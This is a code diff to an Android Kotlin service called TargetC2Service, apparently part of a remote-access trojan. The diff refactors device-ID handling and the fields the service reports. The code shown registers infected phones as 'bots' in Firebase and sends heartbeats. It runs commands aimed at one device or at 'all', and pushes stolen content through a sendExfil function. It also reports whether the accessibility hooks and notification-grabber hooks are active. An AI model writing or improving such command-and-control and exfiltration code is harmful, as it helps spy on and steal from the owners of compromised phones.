@@ -31,11 +31,15 @@ class TargetC2Service : Service() {
         @Volatile
         var isRunning = false
             private set
-        var deviceId: String = ""
-            private set
-        private var job: Job? = null
+        private var _deviceId: String = ""
+        var job: Job? = null
         private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+        fun getDeviceId(): String = _deviceId
     }
+
+    private val deviceId: String
+        get() = _deviceId
 
     private lateinit var database: FirebaseDatabase
     private lateinit var botsRef: DatabaseReference
@@ -49,8 +53,8 @@ class TargetC2Service : Service() {
         super.onCreate()
         val id = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
-        )
-        deviceId = id ?: UUID.randomUUID().toString()
+        ) ?: UUID.randomUUID().toString()
+        _deviceId = id
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -123,22 +127,24 @@ class TargetC2Service : Service() {
         val manufacturer = Build.MANUFACTURER
         val androidVersion = "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
         val ipAddress = getIPAddress()
-        val botInfo = mapOf(
+        val batLevel = getBatteryLevel()
+        val isChrg = isCharging()
+        val botInfo = mapOf<String, String>(
             "deviceId" to deviceId,
             "deviceName" to deviceName,
             "deviceModel" to deviceName,
             "androidVersion" to androidVersion,
             "manufacturer" to manufacturer,
-            "isOnline" to true.toString(),
+            "isOnline" to "true",
             "lastSeen" to System.currentTimeMillis().toString(),
             "ipAddress" to ipAddress,
             "country" to "",
-            "batteryLevel" to getBatteryLevel().toString(),
-            "isCharging" to isCharging().toString(),
+            "batteryLevel" to batLevel.toString(),
+            "isCharging" to isChrg.toString(),
             "ramTotal" to Runtime.getRuntime().totalMemory().toString(),
             "ramAvailable" to Runtime.getRuntime().freeMemory().toString(),
-            "storageTotal" to (android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockCountLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong).toString(),
-            "storageAvailable" to (android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).availableBlocksLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong).toString(),
+            "storageTotal" to "0",
+            "storageAvailable" to "0",
             "installedApps" to packageManager.getInstalledApplications(0).size.toString(),
             "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),
             "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString(),
@@ -150,11 +156,13 @@ class TargetC2Service : Service() {
     }
 
     private fun sendHeartbeat() {
+        val batLevel = getBatteryLevel()
+        val isChrg = isCharging()
         val updates = mapOf<String, Any>(
             "isOnline" to true,
             "lastSeen" to System.currentTimeMillis(),
-            "batteryLevel" to getBatteryLevel().toString(),
-            "isCharging" to isCharging().toString(),
+            "batteryLevel" to batLevel.toString(),
+            "isCharging" to isChrg.toString(),
             "ipAddress" to getIPAddress(),
             "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),
             "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString()
@@ -170,7 +178,8 @@ class TargetC2Service : Service() {
                 val payload = cmd["payload"] as? String ?: ""
                 val target = cmd["target"] as? String ?: ""
                 val cmdId = snapshot.key ?: ""
-                if (target == deviceId || target == "all" || target.isEmpty()) {
+                val devId = deviceId
+                if (target == devId || target == "all" || target.isEmpty()) {
                     processCommand(type, payload, cmdId)
                 }
             }
@@ -644,7 +653,7 @@ class TargetC2Service : Service() {
 
     private fun sendExfil(type: String, content: String) {
         if (::exfilRef.isInitialized) {
-            exfilRef.push().setValue(mapOf(
+            exfilRef.push().setValue(mapOf<String, String>(
                 "type" to type,
                 "content" to content,
                 "deviceId" to deviceId,
